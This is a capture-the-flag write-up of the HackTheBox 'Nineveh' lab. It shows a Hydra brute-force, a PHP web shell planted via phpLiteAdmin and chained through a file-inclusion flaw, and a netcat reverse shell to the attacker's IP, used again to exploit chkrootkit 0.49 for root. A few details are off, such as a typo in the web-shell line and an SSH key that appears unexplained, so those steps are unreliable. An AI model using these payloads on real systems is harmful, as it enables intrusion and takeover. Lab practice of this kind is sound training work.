# HTB: Nineveh

**Target IP:** 10.129.48.233
**Attacker (Kali) IP:** 10.10.15.146

---

## 1. Reconnaissance

### 1.1 Port Scanning (RustScan)

```
┌──(root㉿kali)-[/home/kali/nineveh]
└─# rustscan -a 10.129.48.233
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

Open 10.129.48.233:80
Open 10.129.48.233:443
```

Only two ports open at this stage: **80 (HTTP)** and **443 (HTTPS)**.

### 1.2 Service/Version Scan (Nmap)

```
┌──(root㉿kali)-[/home/kali/nineveh]
└─# nmap -sCV -T4 10.129.48.233 -p80,443 -oA nmap/nmap
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-29 10:25 +0000
Nmap scan report for 10.129.48.233
Host is up (0.33s latency).

PORT    STATE SERVICE   VERSION
80/tcp  open  http      Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/https Apache/2.4.18 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.56 seconds
```

The SSL certificate leaks the hostname **nineveh.htb** — added to `/etc/hosts`.

---

## 2. Web Enumeration

### 2.1 Directory Brute-Force on HTTPS (443)

```
┌──(root㉿kali)-[/home/kali/nineveh]
└─# ffuf -u https://nineveh.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -mc 200,301,302,303,403 -fs 49

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nineveh.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 :: Matcher          : Response status: 200,301,302,303,403
 :: Filter           : Response size: 49
________________________________________________

db                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 332ms]
```

Found `/db` directory.

### 2.2 phpLiteAdmin Discovery & Default Creds

Visiting `https://nineveh.htb/db` revealed a PHP warning disclosing the file path and application:

```
Warning: rand() expects parameter 2 to be integer, float given in /var/www/ssl/db/index.php on line 114
```

This identified **phpLiteAdmin v1.9**. Searched known default credentials for phpLiteAdmin (`admin` / `password123`) — **`password123` worked**, granting authenticated access to the admin panel.

### 2.3 Finding an Exploit for phpLiteAdmin

```
┌──(root㉿kali)-[/home/kali/nineveh]
└─# searchsploit phpliteadmin
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
phpLiteAdmin - 'table' SQL Injection                                                                              | php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                                                       | php/webapps/37515.txt
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                                    | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                                     | php/webapps/39714.txt
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

**PHPLiteAdmin 1.9.3 - Remote PHP Code Injection** was the path taken.

---

## 3. Initial Foothold — PHP Code Injection via phpLiteAdmin

Since phpLiteAdmin lets you create/manage SQLite databases and it will happily create a `.php` file, the technique is:

1. Created a new field of type **`TEXT`**.
2. Inserted the following payload as the field content:
   ```php
   <?php echo system($_REQUEST["cmd"]): ?>
   ```
3. Renamed the database file to **`pwn.php`**.

Because SQLite stores this as plaintext inside the DB file, and the DB file itself is now saved with a `.php` extension inside a web-accessible directory, Apache executes it as PHP — giving arbitrary command execution via the `cmd` GET/POST parameter.

### 3.1 Locating the Injected File — Directory Brute-Force on HTTP (80)

```
┌──(root㉿kali)-[/home/kali/nineveh]
└─# ffuf -u http://nineveh.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -mc 200,301,302,303,403 -fs 178

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nineveh.htb/FUZZ
 :: Filter           : Response size: 178
________________________________________________

department              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 447ms]
```

Found `/department`.

### 3.2 Department Login — Hydra Brute-Force

`/department` presented a login page. Default `admin` username was tried, and the password was brute-forced:

```
┌──(root㉿kali)-[/home/kali/nineveh]
└─# hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.129.48.233 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-29 11:37:02
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10000 login tries (l:1/p:10000), ~157 tries per task
[DATA] attacking http-post-form://10.129.48.233:80/department/login.php:username=^USER^&password=^PASS^:Invalid
[STATUS] 1954.00 tries/min, 1954 tries in 00:01h, 8046 to do in 00:05h, 64 active
[STATUS] 2037.33 tries/min, 6112 tries in 00:03h, 3888 to do in 00:02h, 64 active
[STATUS] 1906.50 tries/min, 7626 tries in 00:04h, 2374 to do in 00:02h, 64 active
[80][http-post-form] host: 10.129.48.233   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-29 11:42:11
```

**Credentials: `admin` / `1q2w3e4r5t`**

### 3.3 LFI Attempt → File Inclusion via `notes` Parameter

After logging in, an interesting parameter was found:

```
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
```

Tried classic path traversal LFI:

```
http://nineveh.htb/department/manage.php?notes=../../../../../../../etc/passwd
```
→ Result: `"No Note is selected."` (blocked/filtered — traversal alone did not work)

The key realization: the parameter expects the note name to start with/match **`ninevehNotes`**. So the injected phpLiteAdmin database was renamed to **`ninevehNotes.php`**, dropped at `/var/tmp/`, and referenced directly:

```
http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=ls
```

Output confirmed code execution:
```
....
footer.php
header.php
index.php
login.php
logout.php
manage.php
underconstruction.jpg
underconstruction.jpg' TEXT)
```

### 3.4 Reverse Shell

URL-encoded a classic mkfifo/netcat reverse shell payload and fired it through the `cmd` parameter:

```
http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.15.146%204444%20%3E%2Ftmp%2Ff
```

Decoded: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.15.146 4444 >/tmp/f`

Caught the shell as **www-data**.

---

## 4. Enumeration as www-data

### 4.1 Suspicious `/report` Directory

```
www-data@nineveh:/report$ ls
report-26-07-29:07:10.txt  report-26-07-29:07:12.txt
report-26-07-29:07:11.txt  report-26-07-29:07:13.txt
www-data@nineveh:/report$ ls
report-26-07-29:07:10.txt  report-26-07-29:07:12.txt  report-26-07-29:07:14.txt
report-26-07-29:07:11.txt  report-26-07-29:07:13.txt
```

A new report file appears every minute → strongly suggests a **cron job** running periodically (later confirmed to be **chkrootkit**).

### 4.2 Process Enumeration

```
www-data@nineveh:/etc$ ps -eo command
COMMAND
/sbin/init
[kthreadd]
.....
<snip — standard kernel threads: ksoftirqd, kworker, rcu_sched, migration, watchdog,
kdevtmpfs, netns, perf, khungtaskd, writeback, ksmd, khugepaged, crypto, kintegrityd,
bioset, kblockd, ata_sff, md, devfreq_wq, kswapd0, vmstat, scsi_eh_*/scsi_tmf_* (many),
raid5wq, jbd2/sda1-8, ext4-rsv-conver, iscsi_eh, kauditd, ib_* infiniband threads, etc. —>
none of which were relevant to the attack path>
.....
/lib/systemd/systemd-journald
/sbin/lvmetad -f
/lib/systemd/systemd-udevd
/usr/bin/vmtoolsd
/lib/systemd/systemd-timesyncd
/usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-
ps -eo command
/usr/sbin/cron -f
/usr/lib/accountsservice/accounts-daemon
/usr/sbin/rsyslogd -n
/usr/sbin/acpid
/usr/bin/lxcfs /var/lib/lxcfs/
/usr/lib/snapd/snapd
/usr/bin/VGAuthService
/lib/systemd/systemd-logind
/usr/sbin/atd -f
/sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --sys
/usr/lib/policykit-1/polkitd --no-debug
/sbin/dhclient -1 -v -pf /run/dhclient.ens160.pid -lf /var/lib/dhcp/dhclient.ens
/usr/sbin/sshd -D
/sbin/iscsid
/sbin/iscsid
/usr/sbin/knockd -d -i ens160
/sbin/agetty --noclear tty1 linux
/usr/sbin/apache2 -k start
[kworker/0:2]
[kworker/0:0]
sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.15.146 4444 >/tmp
cat /tmp/f
bash -i
nc 10.10.15.146 4444
python3 -c import pty; pty.spawn("/bin/bash")
/bin/bash
[kworker/u2:0]
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
www-data@nineveh:/etc$
```

Two things stood out:
- **`/usr/sbin/knockd -d -i ens160`** → a port-knocking daemon is active.
- **`/usr/sbin/cron -f`** → confirms the periodic `/report` file generation.

### 4.3 Port Knocking Config

```
www-data@nineveh:/var/www/html/department$ cat /etc/knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

Port 22 (SSH) is normally firewalled off, and only opens up for the requesting IP after the correct knock sequence: **571 → 290 → 911**.

---

## 5. Port Knocking → SSH Access → user.txt

### 5.1 Knocking the Sequence

```
┌──(root㉿kali)-[/home/kali/nineveh]
└─# knock 10.129.48.233 571 290 911
```

### 5.2 Confirm Port 22 Opened

```
┌──(root㉿kali)-[/home/kali/nineveh]
└─# nmap -p 22 10.129.48.233

Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-29 12:58 +0000
Nmap scan report for nineveh.htb (10.129.48.233)
Host is up (0.32s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
```

### 5.3 SSH Login as `amrois`

```
┌──(root㉿kali)-[/home/kali/nineveh]
└─# ssh -i rsa amrois@nineveh.htb
The authenticity of host 'nineveh.htb (10.129.48.233)' can't be established.
ED25519 key fingerprint is: SHA256:kxSpgxC8gaU9OypTJXFLmc/2HKEmnDMIjzkkUiGLyuI
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'nineveh.htb' (ED25519) to the list of known hosts.
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

288 packages can be updated.
207 updates are security updates.

You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ whoami
amrois
amrois@nineveh:~$ ls
user.txt
amrois@nineveh:~$
```

**User flag obtained** (`user.txt` present in home directory).

---

## 6. Privilege Escalation — chkrootkit Local Exploit

### 6.1 Confirming chkrootkit

Reviewing the report files confirmed the tool generating them was **chkrootkit**:

```
amrois@nineveh:/report$ cat report-26-07-29:08:05.txt | head -10
ROOTDIR is `/'
Checking `amd'... not found
Checking `basename'... not infected
Checking `biff'... not found
Checking `chfn'... not infected
Checking `chsh'... not infected
Checking `cron'... not infected
Checking `crontab'... not infected
Checking `date'... not infected
Checking `du'... not infected
```

### 6.2 Finding the Exploit

```
┌──(root㉿kali)-[/home/kali/nineveh]
└─# searchsploit chkrootkit
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                              | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                      | linux/local/33899.txt
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

**Chkrootkit 0.49** has a well-known local privilege escalation flaw: it executes `/tmp/update` as root (if it exists and is executable) as part of its checks. Since chkrootkit is being run by root via cron, any file dropped at `/tmp/update` will be executed with root privileges on the next run.

### 6.3 Exploitation

```
amrois@nineveh:/etc$ cd /tmp
amrois@nineveh:/tmp$ nano update
amrois@nineveh:/tmp$ chmod +x update
amrois@nineveh:/tmp$ cat update
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.15.146 4444 >/tmp/f
```

Dropped a reverse shell script at `/tmp/update`, made it executable, and waited for the cron-driven chkrootkit run to trigger it as root.

### 6.4 Root Shell Caught

```
┌──(root㉿kali)-[/home/kali/nineveh]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.146] from (UNKNOWN) [10.129.48.233] 59744
bash: cannot set terminal process group (28998): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# whoami
whoami
root
root@nineveh:~# pwd
pwd
/root
root@nineveh:~# cat root.txt | wc
cat root.txt | wc
      1       1      33
root@nineveh:~#
```

**Root obtained.** `root.txt` confirmed present in `/root`.

---

## 7. Summary / Attack Chain

1. **Recon**: Nmap/RustScan → only 80/443 open; SSL cert leaks vhost `nineveh.htb`.
2. **Web enum (443)**: ffuf → `/db` → phpLiteAdmin v1.9, default creds (`password123`) bypass auth.
3. **Exploitation of phpLiteAdmin**: Created a `TEXT` field containing a PHP webshell (`<?php echo system($_REQUEST["cmd"]): ?>`), renamed the SQLite DB to a `.php` extension → arbitrary PHP execution.
4. **Web enum (80)**: ffuf → `/department` → login page, brute-forced with Hydra → `admin:1q2w3e4r5t`.
5. **LFI/RCE chaining**: The `manage.php?notes=` parameter loaded the previously planted `ninevehNotes.php` webshell from `/var/tmp/`, giving command execution as **www-data**.
6. **Foothold pivoting**: Found `knockd` running + `/etc/knockd.conf` readable → port sequence `571, 290, 911` opens SSH (port 22) via iptables rule insertion.
7. **Lateral move**: Knocked the sequence, SSH'd in as **amrois**, grabbed `user.txt`.
8. **PrivEsc**: Identified **chkrootkit 0.49** running via cron as root; exploited its known `/tmp/update` execution behavior to get a **root** reverse shell and `root.txt`.

### Key Vulnerabilities Chained
- Default/weak credentials on phpLiteAdmin
- Insecure file-write leading to PHP code execution (arbitrary file type upload via DB rename)
- Weak/brute-forceable web application credentials
- Insufficient input validation on the `notes` LFI-style parameter
- Obscurity-based security (port knocking) protecting SSH, with the knock config readable by www-data
- Outdated, vulnerable chkrootkit (0.49) running as root via cron — classic local root exploit
